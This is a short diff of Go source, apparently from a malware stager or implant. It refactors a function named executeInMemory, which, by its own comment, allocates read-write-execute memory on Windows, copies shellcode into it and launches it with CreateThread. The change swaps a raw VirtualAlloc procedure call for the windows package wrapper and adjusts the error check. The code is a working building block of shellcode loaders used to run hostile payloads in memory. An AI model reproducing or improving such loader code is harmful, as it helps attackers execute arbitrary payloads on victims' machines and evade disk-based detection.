@@ -41,13 +41,13 @@ func (s *Stager) stageWindows() error {
 // executeInMemory allocates RWX memory, copies shellcode, and executes it
 // using VirtualAlloc + RtlMoveMemory + CreateThread via win/api.
 func executeInMemory(shellcode []byte) error {
-	addr, _, err := api.ProcVirtualAlloc.Call(
+	addr, err := windows.VirtualAlloc(
 		0,
 		uintptr(len(shellcode)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
 	)
-	if addr == 0 {
+	if err != nil {
 		return fmt.Errorf("VirtualAlloc failed: %w", err)
 	}
 
